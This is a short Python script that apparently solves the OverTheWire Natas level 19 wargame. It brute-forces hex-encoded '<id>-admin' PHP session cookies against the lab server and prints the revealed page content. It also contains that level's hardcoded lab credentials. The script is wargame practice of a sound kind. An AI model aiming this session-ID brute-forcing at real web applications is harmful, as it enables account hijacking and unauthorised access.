import requests
from html.parser import HTMLParser

class MyHTMLParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.content_depth = 0
        self.in_pre = False
        self.found_pre = False
        self.pre_content = []

    def handle_starttag(self, tag, attrs):
        if tag == "div":
            if self.content_depth:
                self.content_depth += 1
            elif ("id", "content") in attrs:
                self.content_depth = 1
        elif tag == "pre" and self.content_depth and not self.found_pre:
            self.found_pre = True
            self.in_pre = True

    def handle_endtag(self, tag):
        if tag == "pre" and self.in_pre:
            self.in_pre = False
        elif tag == "div" and self.content_depth:
            self.content_depth -= 1

    def handle_data(self, data):
        if self.in_pre:
            self.pre_content.append(data)

username = "natas19"
pwd = "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT"
CREDENTIALS = (username, pwd)
API_URL = f"http://{username}.natas.labs.overthewire.org"

maxId = 640

print("[!] Brute force started ")

for session_id in range(maxId):
    cookie = f"{session_id}-admin"
    cookie_encoded = cookie.encode("utf-8").hex()
    print(f"trying {cookie_encoded}")
    try:
        response = requests.post(
            API_URL,
            auth=CREDENTIALS,
            data={"username": "test", "password": "test"},
            cookies={"PHPSESSID": str(cookie_encoded)},
        )
        response.raise_for_status()
    except requests.exceptions.RequestException as error:
        print(f"Request failed for ID {session_id}: {error}")
        continue

    parser = MyHTMLParser()
    parser.feed(response.text)
    if parser.found_pre:
        print("".join(parser.pre_content))
        break